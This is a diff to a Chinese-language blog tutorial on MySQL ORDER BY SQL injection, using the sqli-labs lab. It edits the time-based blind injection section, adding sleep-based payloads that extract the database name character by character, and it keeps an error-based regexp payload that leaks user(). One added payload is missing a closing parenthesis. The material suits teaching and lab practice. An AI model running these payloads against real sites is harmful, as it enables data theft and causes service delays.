@@ -95,7 +95,7 @@
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-a840e88901837118.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-9a848ccf5a718492.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-2aab9c0c0e3e20ca.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:updated_time" content="2019-05-30T11:37:22.393Z">
+<meta property="og:updated_time" content="2019-06-01T09:26:39.944Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Mysql 注入之 order by 注入">
 <meta name="twitter:description" content="order by 注入即注入点在 odrer by 后面的注入执行语句：select * from users order by $_GET[&amp;#39;id&amp;#39;] 注入判断这里以sqli-labs第 46 题为例在早期注入大量存在的时候利用order by子句进行快速猜解列数，再配合union select语句进行回显。可以通过修改order参数为较大的整数看回显情况来判断。在不知道列名的情">
@@ -394,7 +394,8 @@
 <p>通过以下可以得知<code>user()</code>第一位为<code>r</code>,<code>ascii</code>码的16进制为<code>0x72</code><br><code>?sort=(select+1+regexp+if(substring(user(),1,1)=0x72,1,0x00))</code>正常<br><img src="https://upload-images.jianshu.io/upload_images/12585049-9a848ccf5a718492.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
 <p><code>?sort=(select+1+regexp+if(substring(user(),1,1)=0x71,1,0x00))</code>报错<br><img src="https://upload-images.jianshu.io/upload_images/12585049-2aab9c0c0e3e20ca.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
 <h5 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h5><p>判断 payload：<code>?sort=if(1=1,sleep(2),1)</code><br>直接使用 <code>sleep</code>函数，将会导致时间延迟<code>2*当前表数目</code>，将会导致一定的拒绝服务攻击。</p>
-<p>判断 payload：<code>?sort=if(1=2,1,(select(1)from(select(sleep(3)))wcute))</code>  # 其中wcute随意指定<br>结果是进行三秒的延迟，即执行<code>sleep(3)</code></p>
+<p>判断 payload：<code>?sort=if(1=2,1,sleep(2)</code> # 由于表中数目未知，延迟时间<code>2*表数目</code>，因此正常网速情况下，延迟时间大于 2 可判断成功执行代码。</p>
+<p>注数据库 payload：<code>?sort=if(ascii(substr(database(),1,1))=114,1,SLEEP(2))</code> # 如果数据库第一个字符的 ascii 为114，则正常执行，否则延迟一段时间，慢慢注吧。</p>
 
       
     </div>
